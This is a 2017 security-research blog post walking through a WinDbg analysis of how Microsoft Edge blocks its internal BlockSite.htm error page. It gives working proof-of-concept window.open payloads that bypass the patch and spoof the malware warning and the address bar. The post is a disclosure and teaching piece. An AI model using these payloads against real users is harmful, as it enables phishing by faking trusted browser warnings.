<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/"><meta property="og:title" content="Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)</h1> <div class="post-meta"> <time> <time datetime="2017-03-15T00:00:00.000Z"> 2017-03-15 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>Yesterday, Microsoft pushed a <a href="https://technet.microsoft.com/library/security/MS17-006">gigantic update</a> where tons of security bugs were fortunately killed, including most ones from this website. Kudos, <strong>big kudos</strong> to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the <a href="../on-patching-security-bugs/">ridiculous IE policies</a> to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.</p>
<p>Bug hunter, if you haven’t seen the <a href="../spoof-addressbar-malware/">original bug</a>, please do so before reading the post below which explains how to bypass the patch.</p>
<p><strong>[ Update: this bug was patched on 2017-05-09 by also bypassed the same day ]</strong></p>
<p><strong>New PoC [2017-05-09]</strong></p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages/\\BlockSite.htm?BlockedDomain=facebook.com&#x26;Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<h2 id="super-quick-recap">Super Quick Recap</h2>
<p>MS Edge allowed us to load some of its internal resources including html pages like <em>acr_error.htm</em> but it did not not allow us to load <em>BlockSite.htm</em>. Why? Because this last page can be easily used to spoof the internal malware warning message <strong>and</strong> the address bar. We bypassed that restriction a few months ago by <a href="../spoof-addressbar-malware/">changing a dot from the URL to its escaped counterpart %2e</a> and now it has been patched. Edge developers are decoding (unescaping) our tricky URL before doing the check/string comparison, so, we need to find another way. Come on bug hunter! Close that facebook tab which is distracting you, taking your time for nothing. Close it and let’s dive into this fascinating ocean of super-interesting bits.</p>
<h2 id="no-symbols-today">No symbols today</h2>
<p>Microsoft did not upload many of their public symbols yet so our analysis won’t be as pretty as it could have been in a week (once symbols are up). But no worries because we will try to bypass this anyway, just keep in mind that we will go straight to the point using the attacker’s approach: we just want to bypass the patch and that’s it. I don’t imagine an attacker thinking “<em>oh, I need to take a week off because Microsoft didn’t push the symbols yet</em>”.</p>
<h2 id="finding-the-string-blocksitehtm">Finding the string “blocksite.htm”</h2>
<p>We know that somewhere in the gigantic Edge code there has to be a string comparison against <em>BlockSite.htm</em>, so we will attach to Edge, find that string and set a breakpoint on memory access to see which code tries to read it.</p>
<p>The following JavaScript code throws an ACCESS_DENIED without even opening the new window.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>Edge is blocking this internal URL for a good reason: this particular error page accepts arguments in the hash/query-string allowing the attacker to spoof the address-bar and content of the page.</p>
<p>Our goal is to open that URL fooling Edge again. However, for this task we will use the following URL (encoded dot and facebook at the end so we can later recognize our own string in memory)</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>Let’s attach to Edge and find the string *BlockSite.htm *limiting our search to the EdgeHtml.dll module, where most Edge code resides. It’s just a guess and if we don’t find anything we will try other modules or even grep all Edge files.</p>
<p>Once attached to the correct Edge process, we will need to know the Edge module start/end address so we can do our search only in that memory range.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0:029> lm m edgehtml</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Browse full module list</span></span>
<span class="line"><span>start end module name</span></span>
<span class="line"><span>00007fff`54ba0000 00007fff`5614d000 edgehtml</span></span></code></pre>
<p>Now we will feed the search command with that address range and the string that we are interested in. WinDbg syntax is intimidating for me but I can tell you that the instruction below is doing a search <strong>s</strong> and returning only the addresses <strong>[1]</strong> of a unicode string <strong>u</strong> between those ugly 64bit addresses. Ahh! the string is <em>BlockSite</em>.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0:029> s -[1]u 00007fff`54ba0000 00007fff`5614d000 "BlockSite"</span></span>
<span class="line"><span>0x00007fff`55d90846</span></span>
<span class="line"><span>0x00007fff`55d90944</span></span>
<span class="line"><span>0x00007fff`55e52c02</span></span>
<span class="line"><span></span></span></code></pre>
<p>Nice. It seems WinDbg immediately returned three addresses. Let’s see if it got them right. Du du du. Like Dudú, my friend Eduardo who is nicknamed “Dudú”.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0:029> du 0x00007fff`55d90846; du 0x00007fff`55d90944; du0x00007fff`55e52c02</span></span>
<span class="line"><span>00007fff`55d90846 "BlockSite.htm"</span></span>
<span class="line"><span>00007fff`55d90944 "BlockSite.htm"</span></span>
<span class="line"><span>00007fff`55e52c02 "BlockSite.htm"</span></span></code></pre>
<p>I’m getting excited. We will set a breakpoint on memory access on those three addresses. We want to find out who is accessing that string.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ba r1 0x00007fff`55d90846</span></span>
<span class="line"><span>ba r1 0x00007fff`55d90944</span></span>
<span class="line"><span>ba r1 0x00007fff`55e52c02</span></span>
<span class="line"><span>g (keep running, Edge!)</span></span></code></pre>
<p>Excellent. Now let’s go to our JavaScript code and try to open our malicious (buuhh!) URL.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>Wow! Immediate breakpoint. We are back into WinDbg. Let’s see what we have.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Breakpoint 0 hit</span></span>
<span class="line"><span>KERNELBASE!lstrlenW+0x18:</span></span>
<span class="line"><span>00007fff`74f6e2c8 75f6 jne KERNELBASE!lstrlenW+0x10 (00007fff`74f6e2c0) [br=1]</span></span>
<span class="line"><span></span></span></code></pre>
<p>It seems that we are in a kernelbase module right now but our goal is to find out which code <strong>of the EdgeHtml module</strong> referenced this string. Let’s take a look at the latest 5 calls in the stack trace.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0:013> k 5</span></span>
<span class="line"><span># Child-SP RetAddr Call Site</span></span>
<span class="line"><span>00 000000d3`14df8de8 00007fff`74f70244 KERNELBASE!lstrlenW+0x18</span></span>
<span class="line"><span>01 000000d3`14df8df0 00007fff`54fee629 KERNELBASE!StrStrIW+0x54</span></span>
<span class="line"><span>02 000000d3`14df8eb0 00007fff`55004e6b edgehtml!Ordinal107+0xc6059</span></span>
<span class="line"><span>03 000000d3`14df9f50 00007fff`55007272 edgehtml!Ordinal107+0xdc89b</span></span>
<span class="line"><span>04 000000d3`14df9f80 00007fff`55004cae edgehtml!Ordinal107+0xdeca2</span></span>
<span class="line"><span></span></span></code></pre>
<p>The first two belong to the kernelbase module, but the following one comes from edgehtml. To be clear, a piece of code from the edgehtml has called the function StrStrIW from the kernelbase module/library which seems to be pretty standard. A quick Google search for <strong>StrStrIW</strong> takes us to the function <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-strstriw">documentation on MSDN</a>.</p>
<p><img src="/images/2017/03/01-str.png" alt=""></p>
<p>The documentation is pretty clear and thanks to the stack-trace, we know that edgehtml is calling this function. Let’s set a breakpoint into the Edge returning address to analyze the code before that point. <em>(By the way, we can arrive to the same point using a “step to next return” twice (pt). Experiment!)</em></p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>bp edgehtml!Ordinal107+0xc6059</span></span>
<span class="line"><span>g</span></span>
<span class="line"><span></span></span></code></pre>
<p>Bang! We immediately break here</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Breakpoint 3 hit</span></span>
<span class="line"><span>edgehtml!Ordinal107+0xc6059:</span></span>
<span class="line"><span>00007fff`54fee629 4885c0 test rax,rax</span></span></code></pre>
<p>But we are just coming back from the string comparison, so let’s look a bit up to see what happened. In WinDbg we can quickly unassemble backward (ub)</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0:013> ub $ip</span></span>
<span class="line"><span>edgehtml!Ordinal107+0xc602d:</span></span>
<span class="line"><span>00007fff`54fee5fd lea rdx,[edgehtml!Ordinal138+0x3e4ff8 (00007fff`55d5e6b8)]</span></span>
<span class="line"><span>00007fff`54fee604 lea rcx,[rsp+30h]</span></span>
<span class="line"><span>00007fff`54fee609 call qword ptr [edgehtml!Ordinal138+0x38b5b8 (00007fff`55d04c78)]</span></span>
<span class="line"><span>00007fff`54fee60f test eax,eax</span></span>
<span class="line"><span>00007fff`54fee611 jne edgehtml!Ordinal107+0xc6108 (00007fff`54fee6d8)</span></span>
<span class="line"><span>00007fff`54fee617 lea rdx,[edgehtml!Ordinal138+0x417160] (Second Argument)</span></span>
<span class="line"><span>00007fff`54fee61e lea rcx,[rsp+30h]                      (First Argument)</span></span>
<span class="line"><span>00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8]</span></span>
<span class="line"><span></span></span></code></pre>
<p>Great. Unfortunately we don’t have all the symbols here so everything looks a bit ugly. But no worries, we know we’ve just returned from the call above (the latest line) right? And before that call, there are two arguments being passed, one in <strong>rdx</strong> and another one in <strong>rcx</strong> (those two lea). But we have no idea what’s there at this point because the call already executed and those values could have been changed. Let’s examine this closer by setting a breakpoint in the latest call (so it does not execute) and once we are there examine its arguments:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>bd * (disable previous breakpoints)</span></span>
<span class="line"><span>bp 00007fff`54fee623</span></span>
<span class="line"><span>g</span></span></code></pre>
<p>Now we will have a chance to see exactly what’s there before the comparison. Run the same JavaScript statement</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>Which fires the breakpoint just before doing the string comparison.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Breakpoint 4 hit</span></span>
<span class="line"><span>edgehtml!Ordinal107+0xc6053:</span></span>
<span class="line"><span>00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8] ds:00007fff`55d04c88={KERNELBASE!StrStrIW (00007fff`74f701f0)}</span></span>
<span class="line"><span></span></span></code></pre>
<p>Let’s inspect the arguments passed to the StrStrl function:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0:013> du @rcx (First argument)</span></span>
<span class="line"><span>000000d3`14df8ee0 "ms-appx-web://microsoft.microsof"</span></span>
<span class="line"><span>000000d3`14df8f20 "tedge/assets/errorpages/BlockSit"</span></span>
<span class="line"><span>000000d3`14df8f60 "e.htm?BlockedDomain=facebook.com"</span></span>
<span class="line"><span></span></span>
<span class="line"><span>0:013> du @rdx (Second argument)</span></span>
<span class="line"><span>00007fff`55d90820 "/assets/errorPages/BlockSite.htm"</span></span>
<span class="line"><span></span></span></code></pre>
<p>Aha! We can see here that our %2e (the dot) has already been decoded (it’s a dot instead of our %2e). It seems to me that Edge calls the StrStrl function and then checks if “/assets/errorPages/BlockSite.htm” exists in our URL. Not sure, the following pseudoCode is what I believe at this point:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">var</span><span style="color:var(--astro-code-foreground)"> url </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> "ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm?BlockedDomain=facebook.com"</span><span style="color:var(--astro-code-foreground)">;</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">var</span><span style="color:var(--astro-code-foreground)"> badString </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> "/assets/errorPages/BlockSite.htm"</span><span style="color:var(--astro-code-foreground)">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">if</span><span style="color:var(--astro-code-foreground)"> (badString is inside </span><span style="color:var(--astro-code-token-constant)">URL</span><span style="color:var(--astro-code-foreground)">) </span><span style="color:var(--astro-code-token-constant)">ACCESS_DENIED</span><span style="color:var(--astro-code-foreground)">;</span></span></code></pre>
<p>It is important to remember that we are speculating here, because in reality we haven’ts seen yet any check after this comparison, but because we do have the comparison in front of our eyes, we expect that to happen soon. However, we don’t care too much as long as we can bypass this again, using a similar technique.</p>
<p>The main issue here is that the comparison checks against a hardcoded string but we know URLs can be written in many different ways. Our previous trick was to encode a dot but now we should think of a new one because we know we are being unencoded, and we know the exact string comparison being done.</p>
<p>Many ideas come to my mind like multiple encoding or adding more slashes to the URL. Let’s try by adding a slash in the middle which will fool the string check but hopefully will work as a valid URL. So, we will add a dash after errorPages, just like this:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p><img src="/images/2017/03/02-double-dash.png" alt=""></p>
<p>Wow! It seems a simple double slash bypasses the patch but still, Edge is able to load the URL. Let’s build a better query-string now to completely spoof the malware-page, just as <a href="../spoof-addressbar-malware/">we did before</a>.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com&#x26;Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p><img src="/images/2017/03/03-justin-rogers.png" alt=""></p>
<p>Bug hunter, there are more bypasses coming! Stay tuned and please don’t waste your precious minutes looking at your friend’s vacation pictures :). Close that Facebook tab.</p>
<p>Have a nice day!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a></p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/zombie-alert/" class="button inline prev">
&lt; [The Attack of the Alerts and the Zombie Script (IE)]
</a> <span>::</span> <a href="/blog/uxss-ie-domainless-world/" class="button inline next">
[SOP bypass / UXSS - More Adventures in a Domainless World (IE)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 